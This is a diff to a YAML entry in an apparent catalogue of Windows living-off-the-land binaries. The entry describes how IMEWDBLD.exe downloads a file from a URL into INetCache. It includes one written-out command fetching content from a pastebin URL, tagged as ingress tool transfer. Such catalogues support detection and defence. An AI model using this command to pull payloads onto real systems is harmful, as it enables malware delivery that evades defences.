@@ -5,12 +5,14 @@ Author: 'Wade Hickey'
 Created: 2020-03-05
 Commands:
   - Command: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw
-    Description: IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to %LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION> or %LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>
+    Description: IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache.
     Usecase: Download file from Internet
     Category: Download
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Download: INetCache
 Full_Path:
   - Path: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe
 Detection:
